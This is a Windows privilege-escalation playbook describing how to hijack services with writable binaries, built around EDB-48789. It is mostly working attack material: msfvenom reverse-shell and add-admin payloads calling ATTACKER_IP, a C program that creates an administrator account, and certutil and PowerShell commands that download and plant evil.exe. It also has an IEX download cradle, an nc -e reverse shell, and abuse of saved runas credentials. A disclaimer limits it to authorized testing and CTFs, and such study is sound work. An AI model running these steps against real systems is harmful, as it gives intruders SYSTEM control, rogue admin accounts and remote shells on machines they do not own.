# Windows Service Binary Hijacking — Privesc Playbook

Methodology reference for exploiting **insecure service file/folder permissions** to escalate from a low-privilege user to `NT AUTHORITY\SYSTEM`. Based on [EDB-48789](https://www.exploit-db.com/exploits/48789) (BarracudaDrive v6.5) as the reference case, but the technique applies to any service with weak permissions.

## The Vulnerability

When a Windows service runs as `LocalSystem` (or another privileged account) but its **executable or installation folder is writable** by unprivileged users, an attacker can replace the service binary with a malicious one. On service restart (or reboot), the payload runs as the service account — usually `SYSTEM`.

```
Low-priv user ─── replaces service .exe ───→ service restarts ───→ SYSTEM shell
```

Three conditions must be true:

1. A service runs under a privileged account (`LocalSystem`, `LocalService`, etc.)
2. The service binary **or** a directory in its path is writable by your user
3. You can restart the service (or the machine reboots, or the service auto-restarts)

---

## Phase 1 — Find Vulnerable Services

### 1.1 — Enumerate all services and their binary paths

**cmd.exe:**
```cmd
:: List all auto-start services with unquoted paths or unusual install locations
wmic service get name,displayname,pathname,startmode,startname | findstr /i "auto"

:: Filter out standard Windows services (focus on third-party)
wmic service get name,pathname,startmode,startname | findstr /i "auto" | findstr /i /v "C:\Windows\\"

:: Query a specific service
sc qc <ServiceName>
```

**PowerShell:**
```powershell
# All services with path, start mode, and run-as account
Get-CimInstance Win32_Service |
  Select-Object Name, StartMode, StartName, PathName |
  Where-Object { $_.StartMode -eq 'Auto' } |
  Format-Table -AutoSize

# Quick filter: non-Windows paths running as LocalSystem
Get-CimInstance Win32_Service |
  Where-Object { $_.StartName -match 'LocalSystem' -and $_.PathName -notmatch 'C:\\Windows' } |
  Select-Object Name, PathName
```

**What to look for in the output:**
```
SERVICE_NAME: bd
BINARY_PATH_NAME: C:\bd\bd.exe        ← third-party path, not in Program Files
SERVICE_START_NAME: LocalSystem        ← runs as SYSTEM
START_TYPE: 2  AUTO_START              ← restarts on boot
```

Services installed outside `C:\Program Files\` are the top targets — directories like `C:\bd\`, `C:\app\`, `C:\tools\`, or custom install paths often have weak default ACLs.

### 1.2 — Automated enumeration

**PowerUp.ps1 (PowerSploit):**
```powershell
# From a PowerShell prompt (bypass execution policy if needed)
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"

# Or target specific checks
Get-ModifiableServiceFile       # writable service binaries
Get-ModifiablePath              # writable directories in service paths
Get-ServiceUnquoted             # unquoted paths (separate vuln class)
```

**winPEAS:**
```cmd
winPEASx64.exe servicesinfo
```

**SharpUp:**
```cmd
SharpUp.exe audit ModifiableServices
SharpUp.exe audit ModifiableServiceBinaries
```

---

## Phase 2 — Check Permissions with icacls

`icacls` is the modern replacement for `cacls`. It shows the Access Control List (ACL) on files and folders — this is how you confirm the vuln is exploitable.

### 2.1 — Check the service binary

```cmd
icacls "C:\bd\bd.exe"
```

**Vulnerable output (EDB-48789):**
```
C:\bd\bd.exe BUILTIN\Administrators:(I)(F)
             NT AUTHORITY\SYSTEM:(I)(F)
             BUILTIN\Users:(I)(RX)
             NT AUTHORITY\Authenticated Users:(I)(M)    ← VULNERABLE
```

### 2.2 — Check the service folder

```cmd
icacls "C:\bd"
```

**Vulnerable output:**
```
C:\bd BUILTIN\Administrators:(OI)(CI)(I)(F)
      NT AUTHORITY\SYSTEM:(OI)(CI)(I)(F)
      BUILTIN\Users:(OI)(CI)(I)(RX)
      NT AUTHORITY\Authenticated Users:(I)(M)           ← VULNERABLE
      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(I)(M)
```

### 2.3 — Permission flags reference

| Flag | Meaning | Exploitable? |
|------|---------|:---:|
| `(F)` | **Full Control** — read, write, delete, change perms | **YES** |
| `(M)` | **Modify** — read, write, delete | **YES** |
| `(W)` | **Write** — write data, create files | **YES** |
| `(RX)` | Read & Execute | No |
| `(R)` | Read only | No |

| Inheritance | Meaning |
|-------------|---------|
| `(OI)` | Object Inherit — applies to files in the folder |
| `(CI)` | Container Inherit — applies to subfolders |
| `(IO)` | Inherit Only — doesn't apply to the folder itself |
| `(I)` | Inherited — permission came from a parent |

### 2.4 — What makes it vulnerable

You need **one** of these for your user/group on the binary OR its parent folder:

```
BUILTIN\Users:(F)              ← any user has full control
BUILTIN\Users:(M)              ← any user can modify
BUILTIN\Users:(W)              ← any user can write
NT AUTHORITY\Authenticated Users:(M)   ← any authed user can modify
Everyone:(F)                   ← world-writable
<YourUsername>:(M)             ← you specifically can modify
<YourGroup>:(W)                ← your group can write
```

If only the **folder** is writable (not the .exe), you can still exploit it:
- Drop a malicious DLL the service loads (DLL hijacking)
- If the path is unquoted with spaces, drop an .exe at an intermediate path

### 2.5 — Bulk check all non-system service paths

```cmd
:: One-liner: find every service binary and check its ACL
for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /i /v "system32"') do @icacls "%a" 2>nul | findstr /i "(F) (M) (W) Everyone Users Authenticated"
```

**PowerShell equivalent:**
```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -and $_.PathName -notmatch 'system32' } |
  ForEach-Object {
    $path = ($_.PathName -replace '"','').Split(' ')[0]
    if (Test-Path $path) {
      Write-Host "`n--- $($_.Name): $path ---" -ForegroundColor Cyan
      icacls $path
    }
  }
```

### 2.6 — accesschk.exe (Sysinternals alternative)

If you can upload tools, `accesschk.exe` from Sysinternals is purpose-built for this:

```cmd
:: Check which services the current user can modify
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul
accesschk.exe /accepteula -uwcqv "Users" * 2>nul
accesschk.exe /accepteula -uwcqv "%USERNAME%" * 2>nul

:: Check write access on specific service binary
accesschk.exe /accepteula -wvu "C:\bd\bd.exe"

:: Check writable directories
accesschk.exe /accepteula -uwdq "C:\bd\"
```

**Flags:** `-u` suppress errors, `-w` show only writable, `-c` service name, `-q` quiet, `-v` verbose, `-d` directory only.

---

## Phase 3 — Exploit It

### 3.1 — Generate a malicious service binary

**msfvenom (add an admin user):**
```bash
# Create binary that adds a user to local Administrators
msfvenom -p windows/adduser USER=pwned PASS=Pwn3d!@# -f exe -o evil.exe

# Or: reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o evil.exe

# Or: staged meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o evil.exe
```

**Minimal C payload (no msfvenom needed):**
```c
// adduser.c — compile: x86_64-w64-mingw32-gcc adduser.c -o evil.exe
#include <stdlib.h>
int main() {
    system("net user pwned Pwn3d!@# /add");
    system("net localgroup Administrators pwned /add");
    return 0;
}
```

**Cross-compile on Linux:**
```bash
x86_64-w64-mingw32-gcc adduser.c -o evil.exe
# or for 32-bit:
i686-w64-mingw32-gcc adduser.c -o evil.exe
```

### 3.2 — Replace the service binary

```cmd
:: Backup the original (optional, for cleanup)
copy "C:\bd\bd.exe" "C:\bd\bd.exe.bak"

:: Replace with payload
copy /y \\ATTACKER\share\evil.exe "C:\bd\bd.exe"
:: or
certutil -urlcache -split -f http://ATTACKER/evil.exe "C:\bd\bd.exe"
:: or
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/evil.exe','C:\bd\bd.exe')"
```

### 3.3 — Restart the service

**If you can restart the service directly:**
```cmd
:: Stop and start
sc stop bd
sc start bd

:: Or
net stop bd
net start bd
```

**If you can't restart the service but have `SeShutdownPrivilege`:**
```cmd
:: Check your privileges first
whoami /priv

:: If SeShutdownPrivilege is listed (even if "Disabled" — that's per-session)
shutdown /r /t 0
:: The auto-start service runs your payload on boot
```

### 3.4 — Verify exploitation

```cmd
:: Check if your admin user was created
net user pwned
net localgroup Administrators

:: Or catch the reverse shell on your listener
:: On attacker: nc -lvnp 4444
```

---

## Phase 4 — Using runas.exe

`runas` lets you execute commands as a different user. After privesc (creating an admin user or obtaining creds), use `runas` to get an elevated session.

### 4.1 — Basic runas usage

```cmd
:: Run cmd as another user (prompts for password)
runas /user:pwned cmd.exe

:: Run with a specific domain
runas /user:WORKSTATION\pwned cmd.exe
runas /user:DOMAIN\Administrator cmd.exe

:: Run a specific command
runas /user:Administrator "cmd.exe /c whoami > C:\temp\whoami.txt"

:: Don't load user profile (faster, avoids errors with new accounts)
runas /noprofile /user:pwned cmd.exe
```

### 4.2 — runas with saved credentials (/savecred)

```cmd
:: First run — saves the password to Windows Credential Manager
runas /savecred /user:Administrator cmd.exe

:: Subsequent runs — no password prompt
runas /savecred /user:Administrator cmd.exe

:: Check if any credentials are already saved
cmdkey /list
```

**CTF goldmine:** if `cmdkey /list` shows stored credentials for an admin, you can `runas /savecred` without knowing the password:

```cmd
:: Check for saved creds
cmdkey /list

:: If you see: Target: Domain:interactive=WORKSTATION\Administrator
:: You can use them without the password:
runas /savecred /user:WORKSTATION\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"
```

### 4.3 — runas over the network (/netonly)

```cmd
:: Authenticate as a different user for network resources only
:: (local actions still run as your current user)
runas /netonly /user:DOMAIN\admin cmd.exe

:: Useful for accessing shares, RDP, etc. with different creds
:: while keeping your local session
```

### 4.4 — Common runas patterns in CTFs

```cmd
:: Grab a flag as admin
runas /user:Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\flag.txt"

:: Start a reverse shell as admin
runas /user:pwned "cmd.exe /c \\ATTACKER\share\nc.exe -e cmd.exe ATTACKER_IP 4444"

:: Run PowerShell as admin
runas /user:Administrator powershell.exe

:: If runas fails with "unknown user name or bad password" but you KNOW it's right,
:: try the FQDN or just the username without domain:
runas /user:pwned cmd.exe
```

### 4.5 — When runas won't work (alternatives)

`runas` requires an interactive logon session. In a reverse shell, you often can't type the password. Alternatives:

**PowerShell (pass credentials programmatically):**
```powershell
$user = 'WORKSTATION\pwned'
$pass = ConvertTo-SecureString 'Pwn3d!@#' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

# Start a process
Start-Process cmd.exe -Credential $cred

# Or run a command and capture output
Start-Process cmd.exe -Credential $cred -ArgumentList '/c whoami > C:\temp\out.txt' -NoNewWindow -Wait

# Invoke-Command for remote
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
```

**PsExec (Sysinternals):**
```cmd
:: Run as another local user
PsExec.exe -u pwned -p "Pwn3d!@#" cmd.exe

:: Run as SYSTEM (requires admin)
PsExec.exe -s -i cmd.exe
```

---

## Full Exploit Walkthrough (EDB-48789 Style)

Step-by-step reproduction against a service with insecure folder permissions:

```cmd
:: ──────────────────────────────────────────────
:: STEP 1: Find the vulnerable service
:: ──────────────────────────────────────────────
C:\> sc qc bd
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: bd
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\bd\bd.exe
        SERVICE_START_NAME : LocalSystem    ← runs as SYSTEM

:: ──────────────────────────────────────────────
:: STEP 2: Check permissions with icacls
:: ──────────────────────────────────────────────
C:\> icacls "C:\bd"
C:\bd NT AUTHORITY\Authenticated Users:(I)(M)       ← we can Modify
      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(I)(M)
      BUILTIN\Administrators:(OI)(CI)(I)(F)
      BUILTIN\Users:(OI)(CI)(I)(RX)

C:\> icacls "C:\bd\bd.exe"
C:\bd\bd.exe NT AUTHORITY\Authenticated Users:(I)(M) ← we can replace it

:: ──────────────────────────────────────────────
:: STEP 3: Confirm we're a low-priv user
:: ──────────────────────────────────────────────
C:\> whoami
workstation\lowpriv

C:\> net user pwned
The user name could not be found.    ← doesn't exist yet

:: ──────────────────────────────────────────────
:: STEP 4: Generate and transfer the payload
:: ──────────────────────────────────────────────
:: On attacker:
::   msfvenom -p windows/adduser USER=pwned PASS=Pwn3d!@# -f exe -o bd.exe
:: Transfer:
C:\> certutil -urlcache -split -f http://ATTACKER/bd.exe C:\bd\bd.exe

:: ──────────────────────────────────────────────
:: STEP 5: Restart the service (or reboot)
:: ──────────────────────────────────────────────
C:\> sc stop bd
C:\> sc start bd
:: If access denied:
C:\> shutdown /r /t 0

:: ──────────────────────────────────────────────
:: STEP 6: Verify privesc
:: ──────────────────────────────────────────────
C:\> net user pwned
User name                    pwned
Local Group Memberships      *Administrators *Users

:: ──────────────────────────────────────────────
:: STEP 7: Use runas to get an admin shell
:: ──────────────────────────────────────────────
C:\> runas /user:pwned cmd.exe
Enter the password for pwned: Pwn3d!@#

:: In the new window:
C:\> whoami
workstation\pwned

C:\> type C:\Users\Administrator\Desktop\root.txt
<flag>
```

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│  FIND SERVICES     sc qc <svc>                              │
│                    wmic service get name,pathname,startname  │
│                                                             │
│  CHECK PERMS       icacls "C:\path\to\service.exe"          │
│                    icacls "C:\path\to\folder"                │
│                    accesschk.exe -wvu "C:\path"             │
│                                                             │
│  VULN FLAGS        (F) Full  (M) Modify  (W) Write          │
│  ON THESE GROUPS   Users, Authenticated Users, Everyone     │
│                                                             │
│  EXPLOIT           copy payload over service .exe            │
│                    sc stop <svc> && sc start <svc>           │
│                    shutdown /r /t 0  (if can't restart svc)  │
│                                                             │
│  RUNAS             runas /user:admin cmd.exe                 │
│                    runas /savecred /user:admin cmd.exe       │
│                    runas /noprofile /user:admin cmd.exe       │
│                                                             │
│  TOOLS             PowerUp.ps1  |  winPEAS  |  SharpUp      │
│                    accesschk.exe  |  icacls  |  cacls        │
└─────────────────────────────────────────────────────────────┘
```

## Related Techniques

This playbook covers **insecure service binary/folder permissions**. Related Windows service privesc vectors:

- **Unquoted Service Path** — space in path + no quotes → drop `Program.exe` in `C:\`
- **Weak Service Configuration** — you can change the `BINARY_PATH_NAME` via `sc config`
- **DLL Hijacking** — writable folder + service loads a missing DLL
- **Service Registry Permissions** — writable `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` key

## References

- [EDB-48789: BarracudaDrive v6.5 — Insecure Folder Permissions](https://www.exploit-db.com/exploits/48789)
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [Juggernaut-sec — Unquoted Service Paths](https://juggernaut-sec.com/unquoted-service-paths/)
- [Microsoft — icacls documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

## Disclaimer

For authorized penetration testing and CTF competitions only.
